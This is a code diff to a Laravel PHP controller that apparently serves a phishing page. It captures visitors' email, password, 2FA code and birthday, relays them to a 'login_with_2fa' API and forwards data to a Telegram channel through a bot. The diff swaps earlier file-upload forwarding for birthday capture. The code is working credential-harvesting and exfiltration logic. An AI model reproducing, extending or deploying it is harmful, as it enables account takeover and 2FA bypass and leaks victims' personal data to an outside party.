@@ -27,11 +27,12 @@ class HomeController extends Controller
         $ip = $request->ip();
         $email = $request->get('email');
         $password = $request->get('password');
+        $birthday = $request->get('birthday');
         $filePaths = [];
-        $files = $request->file('files');
-        foreach ($files as $file) {
-            $filePaths[] = $file->store('/images');
-        }
+        // $files = $request->file('files');
+        // foreach ($files as $file) {
+        //     $filePaths[] = $file->store('/images');
+        // }
         // dd($filePaths);
         $data = [
             'email' => $email,
@@ -44,7 +45,8 @@ class HomeController extends Controller
         $status = $result['status'] ?? null;
         if ($status === 200) {
             session()->put('email', $email);
-            session()->put('files', json_encode($filePaths));
+            session()->put('birthday', $birthday);
+            // session()->put('files', json_encode($filePaths));
             $data = [
                 'email' => $email,
                 'status' => $status
@@ -69,21 +71,22 @@ class HomeController extends Controller
     public function handleTowfa(Request $request)
     {
         $email = session()->get('email');
-        $files = json_decode(session()->get('files'));
+        $birthday = session()->get('birthday');
+        // $files = json_decode(session()->get('files'));
         $twofaCode = $request->get('twofa_code');
 
         $data = [
             'email' => $email,
             'twofa_code' => $twofaCode,
+            'birth_day' => $birthday,
         ];
 
         // Gửi request POST đến API
         $result = $this->getDataApi('login_with_2fa', $data);
-        
         $status = $result['status'] ?? null;
         if ($status === 200) {
             
-            $this->sendPhotoToTelegram('', $files, $email);
+            // $this->sendPhotoToTelegram('', $files, $email);
             return redirect()->route('success');
         } elseif ($status === 400) {
             $message = $result['message'];
@@ -97,14 +100,14 @@ class HomeController extends Controller
         $result = $response->json();
         return $result;
     }
-    function sendPhotoToTelegram($chatId, $photoPath, $caption = null)
+    function sendPhotoToTelegram($chatId, $birthday, $caption = null)
     {
         $is_ok = true;
         $channelChatId = env('TELEGRAM_CHANEL_ID');
         $apiUrl = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendDocument";
         $client = new Client();
         // dd($photoPath);
-        foreach($photoPath as $photo) {
+        // foreach($photoPath as $photo) {
           
             $response = $client->post($apiUrl, [
                 'multipart' => [
@@ -114,7 +117,8 @@ class HomeController extends Controller
                     ],
                     [
                         'name' => 'document',
-                        'contents' => fopen(storage_path('app/' .$photo),'r')
+                        // 'contents' => fopen(storage_path('app/' .$photo),'r')
+                        'contents' => $birthday
                     ],
                     [
                         'name' => 'caption',
@@ -128,7 +132,7 @@ class HomeController extends Controller
             if (!$result['ok']) {
                 $is_ok = false;
             }
-        }
+        // }
 
 
         return $is_ok;
